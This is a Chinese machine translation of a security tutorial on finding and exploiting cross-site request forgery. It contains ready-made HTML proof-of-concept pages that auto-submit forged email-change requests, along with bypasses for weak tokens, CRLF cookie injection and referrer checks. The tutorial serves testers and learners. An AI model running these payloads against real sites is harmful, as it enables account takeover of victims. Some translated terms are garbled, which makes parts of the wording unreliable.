<html>
<head>
<title>Understanding &amp; Exploiting: Cross-Site Request Forgery — CSRF vulnerabilities</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">理解和利用:跨站点请求伪造— CSRF漏洞</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/understanding-exploiting-cross-site-request-forgery-csrf-vulnerabilities-935952375b71?source=collection_archive---------0-----------------------#2020-11-07">https://infosecwriteups.com/understanding-exploiting-cross-site-request-forgery-csrf-vulnerabilities-935952375b71?source=collection_archive---------0-----------------------#2020-11-07</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="ceb6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">跨站点请求伪造(CSRF)是一种攻击，它迫使最终用户在他们当前通过了<strong class="jp ir">身份验证的web应用程序上<strong class="jp ir">执行非预期的动作</strong>。</strong>通过一点社会工程，攻击者可以强迫web应用程序的用户执行攻击者选择的<strong class="jp ir">动作。</strong></p><blockquote class="kl km kn"><p id="7133" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">跨站点脚本(或XSS) </strong>允许攻击者在受害用户的浏览器中执行任意JavaScript。</p><p id="96aa" class="jn jo ko jp b jq jr js jt ju jv jw jx kp jz ka kb kq kd ke kf kr kh ki kj kk ij bi translated"><strong class="jp ir">跨站点请求伪造(或CSRF) </strong>允许攻击者诱导受害用户执行他们不想执行的操作。</p></blockquote><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div role="button" tabindex="0" class="ky kz di la bf lb"><div class="gh gi ks"><img src="../Images/2429e81ecb5815e68c93c6498dc7992a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/0*_vQmJDa7qRtsVnVS.GIF"/></div></div><figcaption class="le lf gj gh gi lg lh bd b be z dk translated"><em class="li">会议骑行:OWASP测试指南</em></figcaption></figure><p id="e902" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">CSRF依赖于<strong class="jp ir">认证会话，</strong>如果受害者登录到易受攻击的应用程序，并被诱骗打开恶意的URL或页面，浏览器将自动附上cookies和生成的请求，以证明请求的真实性，因为这就是浏览器的工作方式。</p><h2 id="b2b9" class="lj lk iq bd ll lm ln dn lo lp lq dp lr jy ls lt lu kc lv lw lx kg ly lz ma mb bi translated"><strong class="ak">理解:跨域请求:</strong></h2><p id="ae05" class="pw-post-body-paragraph jn jo iq jp b jq mc js jt ju md jw jx jy me ka kb kc mf ke kf kg mg ki kj kk ij bi translated"><strong class="jp ir">同源策略</strong>并不禁止一个网站向不同的域发出请求。然而，它确实<strong class="jp ir">阻止发起网站处理对跨域请求的响应</strong>。于是，CSRF的攻击通常都是“<strong class="jp ir">单向</strong>而已。，攻击者可以诱使受害者发出HTTP请求，但他们无法从该请求中检索到响应。</p><h1 id="0ad3" class="mh lk iq bd ll mi mj mk lo ml mm mn lr mo mp mq lu mr ms mt lx mu mv mw ma mx bi translated">在测试CSRF漏洞时要寻找什么？</h1><p id="9ce0" class="pw-post-body-paragraph jn jo iq jp b jq mc js jt ju md jw jx jy me ka kb kc mf ke kf kg mg ki kj kk ij bi translated">可能使应用程序易受CSRF攻击的几点:</p><ol class=""><li id="2c6a" class="my mz iq jp b jq jr ju jv jy na kc nb kg nc kk nd ne nf ng bi translated">该请求执行一个<strong class="jp ir">特权</strong>动作。</li><li id="ee8d" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated">应用程序仅仅依靠HTTP cookies来跟踪会话。</li><li id="8bf7" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated"><strong class="jp ir">没有会话相关的令牌</strong>在请求中的其他地方传输。</li><li id="9d9f" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated">攻击者可以<strong class="jp ir">确定执行该动作所需的所有参数</strong>。</li><li id="d618" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated">除了cookie中的会话令牌之外，<strong class="jp ir">请求中不需要包含不可预测的值</strong>。</li></ol><h2 id="cb9d" class="lj lk iq bd ll lm ln dn lo lp lq dp lr jy ls lt lu kc lv lw lx kg ly lz ma mb bi translated"><strong class="ak">查找CSRF漏洞的步骤:</strong></h2><ol class=""><li id="22ea" class="my mz iq jp b jq mc ju md jy nm kc nn kg no kk nd ne nf ng bi translated">找到一个代表不知情的用户执行敏感动作的<strong class="jp ir">函数</strong>，该函数<strong class="jp ir">完全依赖cookie</strong>来跟踪用户会话。</li><li id="60f9" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated">看看它是否在请求参数中使用了<strong class="jp ir">任何攻击者可以提前完全确定的不可预测的令牌</strong>。</li><li id="cfa1" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated"><strong class="jp ir">创建一个HTML页面* </strong>发布所需的请求，无需任何用户<br/>交互。</li><li id="f8b9" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated">对于<strong class="jp ir"> GET </strong>请求，您可以放置一个<strong class="jp ir"> &lt; img &gt; </strong>标记，将<strong class="jp ir"> src </strong> <br/>属性设置为易受攻击的URL。<br/> <code class="fe np nq nr ns b">&lt;img src=”https://victim.net/email/update?email=attacker@mail.com"&gt;</code></li><li id="406f" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated">对于POST请求，您可以创建一个<strong class="jp ir">表单</strong>，其中包含攻击所需的所有相关参数的隐藏字段，并将其目标设置为易受攻击的URL。<br/> <code class="fe np nq nr ns b"> &lt;form action=”https://victim.net/email/update" method=”POST”&gt;<br/> &lt;input type=”hidden” name=”email” value=”attacker@mail.com” /&gt;<br/> &lt;/form&gt;</code></li><li id="c613" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated">您可以使用JavaScript在页面加载后立即自动提交表单。</li><li id="eddd" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated">登录到应用程序后，使用同一个浏览器加载您制作的<br/>HTML页面。</li><li id="c510" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated">验证在<br/>应用程序中执行了所需的操作。</li></ol><p id="b18c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">*如果涉及大量参数，生成一个HTML页面可能是一项单调乏味的任务。所以，你可以一直:<br/> 1。使用内置在<a class="ae nt" href="https://portswigger.net/burp/pro" rel="noopener ugc nofollow" target="_blank">打嗝套件专业</a> <br/> 2中的<a class="ae nt" href="https://portswigger.net/burp/documentation/desktop/functions/generate-csrf-poc" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> CSRF PoC生成器</strong> </a> <strong class="jp ir"> </strong>。或者使用<strong class="jp ir">在线CSRF PoC生成器</strong>像<a class="ae nt" href="https://security.love/CSRF-PoC-Genorator/" rel="noopener ugc nofollow" target="_blank">安全。爱</a>还是<a class="ae nt" href="http://online.attacker-site.com/html5/csrf_generator/csrf_poc_gen.html" rel="noopener ugc nofollow" target="_blank"> CSRF PoC Gen </a>。</p><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/4440ab7b592089e380ae186c92f3086a.png" data-original-src="https://miro.medium.com/v2/resize:fit:996/0*1LPAbcq9fXttH6aY"/></div></figure><h1 id="214e" class="mh lk iq bd ll mi mj mk lo ml mm mn lr mo mp mq lu mr ms mt lx mu mv mw ma mx bi translated">利用CSRF漏洞:</h1><ol class=""><li id="2e40" class="my mz iq jp b jq mc ju md jy nm kc nn kg no kk nd ne nf ng bi translated"><strong class="jp ir">没有防御的CSRF漏洞<br/> </strong>在没有提供唯一令牌来触发操作的情况下，使用以下示例HTML代码来生成CSRF PoC。根据受害者的位置提供参数值。<br/> <code class="fe np nq nr ns b">&lt;html&gt;<br/> &lt;body&gt;<br/> &lt;form method=”POST” action=”https://victim.net/email/update"&gt;<br/> &lt;input type=”hidden” name=”email” value=”attacker@mail.com” /&gt;<br/> &lt;/form&gt;<br/> &lt;script&gt;<br/> document.forms[0].submit();<br/> &lt;/script&gt;<br/> &lt;/body&gt;<br/>&lt;/html&gt;</code></li><li id="6daf" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated"><strong class="jp ir"> CSRF，令牌验证取决于请求方法<br/> </strong>在请求与HTTP方法绑定的情况下，尝试用GET替换POST，检查它是否仍然触发动作，使用下面的示例HTML代码生成CSRF PoC。根据受害者的位置提供参数值。<br/> <code class="fe np nq nr ns b">&lt;html&gt;<br/> &lt;body&gt; <br/> &lt;form method=”GET” action=”https://victim.net/email/update"&gt;<br/> &lt;input type=”hidden” name=”email” value=”attacker@mail.com” /&gt;<br/> &lt;/form&gt;<br/> &lt;script&gt;<br/> document.forms[0].submit();<br/> &lt;/script&gt;<br/> &lt;/body&gt;<br/>&lt;/html&gt;</code></li><li id="2768" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated"><strong class="jp ir"> CSRF，其中令牌验证取决于令牌是否存在<br/> </strong>在应用发布CSRF令牌的情况下，但<strong class="jp ir">并未授权它</strong>。从请求&amp;中删除csrf参数，检查它是否仍然触发动作，如果是。然后使用CSRF漏洞中陈述的HTML代码生成PoC，不进行任何防御。</li><li id="7526" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated"><strong class="jp ir"> CSRF，其中令牌不绑定到用户会话<br/> </strong>在应用程序发布CSRF令牌，但不将其与用户会话绑定的情况下。<strong class="jp ir">在请求&amp;的csrf参数中提供您的csrf令牌</strong>值，检查它是否仍然触发动作，如果是。然后以类似的方式生成PoC。根据受害者的位置提供参数值。<br/> <code class="fe np nq nr ns b">&lt;html&gt;<br/>&lt;body&gt;<br/>&lt;form method=”POST” action=”https://victim.net/email/update"&gt;<br/>&lt;input type=”hidden” name=”email” value=”attacker@mail.com” /&gt;<br/>&lt;input type=”hidden” name=”csrf” value=”your_csrf_token” /&gt;&lt;/form&gt;<br/>&lt;script&gt;<br/>document.forms[0].submit();<br/>&lt;/script&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;</code></li><li id="b388" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated"><strong class="jp ir"> CSRF，其中令牌被绑定到非会话cookie <br/> </strong>在应用发布CSRF令牌的情况下，它甚至被绑定到cookie(csrf_cookie)，但是该cookie不用于跟踪会话。在请求&amp;中提供您的csrf_cookie &amp; csrf令牌值，检查它是否仍然触发动作，如果是。然后以类似的方式生成PoC。根据受害者的位置提供参数值。<br/> <code class="fe np nq nr ns b">&lt;html&gt;<br/>&lt;body&gt;<br/>&lt;form method=”POST” action=”https://victim.net/email/update"&gt;<br/>&lt;input type=”hidden” name=”email” value=”attacker@mail.com” /&gt;<br/>&lt;input type=”hidden” name=”csrf” value=”your_csrf_token” /&gt;&lt;/form&gt;<br/>&lt;img src=”https://victim.net/?some_action=action%0d%0aSET-Cookie:%20csrfcookie=your_csrf_cookie" onerror=”document.forms[0].submit()”&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;</code></li><li id="aa38" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated"><strong class="jp ir"> CSRF，其中令牌在cookie中被复制<br/> </strong>在应用发布CSRF令牌的情况下，它甚至被绑定到cookie(csrf_cookie)，其中cookie不用于跟踪会话，但是<strong class="jp ir"> csrf_cookie是正在使用的csrf令牌</strong>(或反之亦然)<strong class="jp ir"> </strong>的一部分或与其相同。在请求&amp;中提供您的csrf_cookie &amp; csrf令牌值，检查它是否仍然触发动作，如果是。然后以与上述类似的方式生成PoC。</li><li id="ef34" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated"><strong class="jp ir"> CSRF，其中引用验证依赖于存在的头</strong> <br/>在验证依赖于引用头的情况下。<br/>使用一个<strong class="jp ir">元</strong>标签<code class="fe np nq nr ns b">&lt;meta name=”referrer” content=”never”&gt;</code>来绕过推荐验证检查。然后以类似的方式生成PoC。根据受害者的位置提供参数值。<br/> <code class="fe np nq nr ns b">&lt;html&gt;<br/>&lt;body&gt;<br/>&lt;meta name=”referrer” content=”no-referrer”&gt;<br/>&lt;form method=”POST” action=”https://victim.net/email/update"&gt;<br/>&lt;input type=”hidden” name=”email” value=”attacker@mail.com” /&gt;<br/>&lt;/form&gt;<br/>&lt;script&gt;<br/>document.forms[0].submit();<br/>&lt;/script&gt;<br/>&lt;/body&gt;<br/>&lt;/html&gt;</code></li><li id="fad3" class="my mz iq jp b jq nh ju ni jy nj kc nk kg nl kk nd ne nf ng bi translated"><strong class="jp ir">绕过CSRF验证</strong> <br/>寻找弱的&amp;可预测的CSRF令牌。请参考:</li></ol><div class="nv nw gp gr nx ny"><a href="https://medium.com/bugbountywriteup/open-redirects-bypassing-csrf-validations-simplified-4215dc4f180a" rel="noopener follow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">开放重定向和绕过CSRF验证-简化</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">开放重定向是未经验证的重定向和转发，当web应用程序接受不受信任的输入时，这是可能的…</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">medium.com</p></div></div><div class="oh l"><div class="oi l oj ok ol oh om lc ny"/></div></div></a></div><figure class="kt ku kv kw gt kx gh gi paragraph-image"><div class="gh gi on"><img src="../Images/8da10f1cf68fc4f998d825827328b0f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*DbWV6MCKlF8W7SFJ.jpg"/></div></figure><p id="e6d4" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">参考文献:</strong></p><div class="nv nw gp gr nx ny"><a href="https://portswigger.net/web-security/csrf" rel="noopener  ugc nofollow" target="_blank"><div class="nz ab fo"><div class="oa ab ob cl cj oc"><h2 class="bd ir gy z fp od fr fs oe fu fw ip bi translated">什么是CSRF(跨站请求伪造)？教程和示例|网络安全学院</h2><div class="of l"><h3 class="bd b gy z fp od fr fs oe fu fw dk translated">在本节中，我们将解释什么是跨站点请求伪造，描述一些常见CSRF的例子…</h3></div><div class="og l"><p class="bd b dl z fp od fr fs oe fu fw dk translated">portswigger.net</p></div></div><div class="oh l"><div class="oo l oj ok ol oh om lc ny"/></div></div></a></div></div></div>    
</body>
</html>